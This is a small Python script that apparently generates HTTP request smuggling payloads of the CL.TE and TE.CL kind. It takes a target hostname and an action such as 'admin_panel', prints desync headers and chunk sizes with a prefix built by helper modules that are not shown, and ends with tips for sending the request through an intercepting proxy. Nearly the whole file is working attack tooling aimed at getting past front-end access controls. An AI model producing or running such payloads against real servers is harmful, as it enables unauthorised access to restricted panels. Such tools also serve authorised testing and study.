import argparse
import sys

sys.path.append('./lib')
import tecl, clte

parser = argparse.ArgumentParser(prog="tool", usage="%(prog)s.py -v clte/tecl -host xxxxxxxxxx.net  -a admin_panel -m GET")

parser.add_argument('-v', '--vulnerability', help="Possible values CLTE or TECL", required=True)
parser.add_argument('-host', '--hostname' , help="Target HOSTNAME", required=True)
parser.add_argument('-a', '--action' , help="ex. admin_panel", required=True)
parser.add_argument('-m', '--method', help="Request Methods [GET, POST]", required=True)
args = parser.parse_args()


if(args.vulnerability.lower() == 'clte'):
    print("\n---[CL.TE Payload Generated]---\n")

    print("Transfer-Encoding: chunked\n\n0\n")
    PREF = clte.PREFIX(args.hostname, args.action, args.method.upper())
    
    print(PREF)
    print("\n---[CL.TE Payload Generated]---\n")
elif(args.vulnerability.lower() == 'tecl'):
    print("\n---[TE.CL Payload Generated]---\n")

    print("Transfer-Encoding: chunked\nContent-Length: 3\n")
    PREF = tecl.PREFIX(args.hostname, args.action, args.method.upper())
    CHUNK = tecl.CHUNK_CALC(PREF)

    print(CHUNK + "\n" + PREF.replace("x=1","\nx=1") + "0")

    print("\n---[TE.CL Payload Generated]---\n\n[INFO]> Dont forget the \\r\\n after 0\nAlso disable the auto-update Content-Length from menu")
else:
    print("error")
    exit(1)


